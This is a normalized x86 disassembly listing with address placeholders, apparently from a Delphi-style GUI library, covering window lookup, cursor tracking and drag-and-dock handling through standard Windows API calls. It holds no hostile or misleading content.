jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_48ad10
test al al
je r-xdata
push 0x2
push esi
call GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_48ae90
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x1c ]
mov [ eax + 0x1c ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
mov ecx [ edx + 0x30 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x34 ]
mov [ eax + 0x34 ] ecx
retn
sub_48af18
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_4488a4#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ edx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_48c08c
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_48b9fc
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ edx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edx + 0x8 ]
mov [ ebp - 0x10 ] eax
movsx eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
movsx eax [ ebp - 0xe ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_48b9fc
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ edx + 0xc ] 0x1
xor eax eax
call sub_48c08c
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_48b9fc
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_48c08c
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
jmp r-xdata
mov al 0x1
call sub_48c08c
jmp r-xdata
xor eax eax
call sub_48c08c
jmp r-xdata
sub_48b01c
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_482674
call sub_448cfc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_48c08c
sub_48b074
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_48b09e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_48b0e4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_448180
mov [ edi + 0x40 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_48b120
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_48ae90
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x40 ]
mov [ ebx + 0x40 ] eax
sub_48b14c
push ebp
mov ebp esp
push esi
push edi
mov esi eax
mov edi [ esi + 0x40 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov eax edi
mov si 0xffde
call sub_4483f8
sub_48b170
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x40 ]
mov si 0xffe0
call sub_4483f8
xor edx edx
sub_48b1c8
push ebx
mov ebx eax
mov eax [ ebx + 0x40 ]
mov edx [ eax ]
call [ edx + 0x78 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x40 ]
mov edx [ eax ]
call [ edx + 0x78 ]
call sub_498a3c
sub_48b1e8
push ebx
mov ebx eax
mov eax [ ebx + 0x40 ]
mov edx [ eax ]
call [ edx + 0x78 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x40 ]
mov edx [ eax ]
call [ edx + 0x78 ]
call sub_498a24
sub_48b20c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_48b0e4
mov [ ebx + 0x38 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_46dd60
mov esi eax
mov [ ebx + 0x48 ] esi
mov edx 0xffffff
xor eax eax
call sub_473a8c
mov edx eax
mov eax esi
call sub_46def0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_48b274
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax [ esi + 0x48 ]
call sub_4481b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4481a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_48b2a4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_48b120
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
movzx edx [ eax + 0x5c ]
mov [ ebx + 0x5c ] dl
mov edx [ eax + 0x60 ]
mov [ ebx + 0x60 ] edx
movzx edx [ eax + 0x74 ]
mov [ ebx + 0x74 ] dl
push esi
lea esi [ eax + 0x4c ]
lea edi [ ebx + 0x4c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x64 ]
lea edi [ ebx + 0x64 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x48 ]
mov eax [ ebx + 0x48 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_48b320
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_48b344
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_48b320
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_48b320
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
mov ecx eax
neg ecx
mov edx esi
neg edx
lea eax [ ebx + 0x4c ]
call sub_432b28
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_48b404
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
cmp esi [ ebx + 0x4 ]
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea edx [ ebx + 0xc ]
lea eax [ ebp - 0x10 ]
call sub_432a8c
test al al
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ ebx ]
jne r-xdata
xor eax eax
mov [ ebx + 0x14 ] 0x1
jmp r-xdata
mov [ ebx + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor edx edx
mov [ ebx + 0x8 ] edx
jmp r-xdata
sub_48b464
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov esi eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_48b8a4
mov ebx eax
mov [ ebp - 0x14 ] ebx
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x170 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_48a70c
mov ebx eax
test ebx ebx
je r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx esi
jmp r-xdata
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
call sub_496868
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov ebx eax
mov eax ebx
call sub_496868
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_496868
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax esi
mov si 0xffbc
call sub_4483f8
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x8 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_48b404
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ebx eax
mov eax ebx
call sub_496868
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea ecx [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
lea eax [ ebp - 0x2c ]
call sub_432ab0
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x90 ]
call sub_496868
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_48b600
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_496868
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_496868
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_48b644
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb8 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_48ae2c
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_48b464
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4246e8
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_496868
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_48b600
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbb
call sub_4483f8
test al al
je r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbc
call sub_4483f8
cmp [ ebp - 0x1 ] 0x0
je r-xdata
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x28 ]
call sub_432a8c
test al al
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_48ad74
sub_48b790
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_424744
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_4245dc
mov edx esi
mov eax [ rw-data ]
call sub_424590
jmp r-xdata
sub_48b7ec
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageW
mov ecx eax
sub_48b844
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_449db8
push eax
call GlobalFindAtomW
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_48a6d8
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropW
test eax eax
setne bl
jmp r-xdata
sub_48b8a4
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_48b844
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_48b8d0
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_48b644
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_48b8a4
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_48b7ec
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_496868
mov [ esi ] eax
sub_48b920
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x14 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_48b7ec
cmp eax 0x1
sbb eax eax
inc eax
sub_48b95c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ esi + 0x1e3 ] 0x0
je r-xdata
cmp [ esi + 0x1bc ] 0x0
je r-xdata
mov eax esi
call sub_4950dc
test eax eax
je r-xdata
mov eax esi
call sub_4950dc
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_48c3fc
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x1bc ]
call sub_4246e8
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x1bc ]
call sub_424744
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx edi
mov eax esi
call sub_4950f0
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_48b9fc
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
movzx ecx [ eax + 0x8b ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_48b8d0
mov esi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ ebx ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ ebx + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_4988e0
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ ebx ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov al 0x1
call sub_48b920
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp esi [ eax + 0x14 ]
je r-xdata
mov eax [ ebx + 0x4 ]
push eax
mov al 0x2
call sub_48b920
mov edx eax
mov ecx [ ebx ]
mov eax [ rw-data ]
mov edi [ eax ]
call [ edi + 0x4 ]
mov edi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax [ rw-data ]
mov eax [ eax + 0x14 ]
call sub_48dac0
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x18 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x1c ] edx
mov eax [ rw-data ]
mov [ eax + 0x14 ] esi
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ ebx ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_48b920
cmp [ rw-data ] 0x0
je r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_47fbcc
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_498890
mov eax [ rw-data ]
cmp [ eax + 0x72 ] 0x0
jne r-xdata
test [ esi + 0x51 ] 0x20
jne r-xdata
call sub_48b95c
mov edi eax
mov eax [ rw-data ]
mov [ eax + 0x60 ] edi
test edi edi
jne r-xdata
mov edx [ ebx + 0x4 ]
push edx
mov ecx [ ebx ]
mov eax [ rw-data ]
mov edx [ eax + 0x40 ]
xchg edx eax
mov si 0xffe8
call sub_4483f8
jmp r-xdata
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax [ rw-data ]
call sub_4989e0
jmp r-xdata
mov eax [ ebx + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ ebx ]
mov eax [ rw-data ]
call sub_4988e0
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax edi
call sub_48dac0
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffd9
call sub_4483f8
mov edx [ rw-data ]
mov [ edx + 0x5c ] al
mov eax [ rw-data ]
lea edx [ eax + 0x18 ]
mov eax [ rw-data ]
mov eax [ eax + 0x14 ]
mov si 0xffd9
call sub_4483f8
mov edx [ rw-data ]
mov [ edx + 0x5c ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_498a54
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_47fbcc
push eax
call SetCursor
mov ebx [ rw-data ]
lea edx [ ebx + 0x64 ]
lea eax [ ebx + 0x4c ]
mov ecx 0x10
call sub_434e78
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x4c ]
lea edi [ eax + 0x64 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_48bce4
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x14 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_48aed0
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x4c ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x28 ] ecx
mov [ edx + 0x2c ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x28 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_4988e0
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x30 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_48b9fc
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_48be54
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_48bff9
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x8b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe4
call sub_4483f8
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdd
call sub_4483f8
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x40 ]
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_48b20c
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_48bce4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_48b0e4
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x40 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x4c
push eax
mov eax esi
call sub_496868
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_432a5c
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_48d98c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x4c ]
lea edi [ eax + 0x64 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
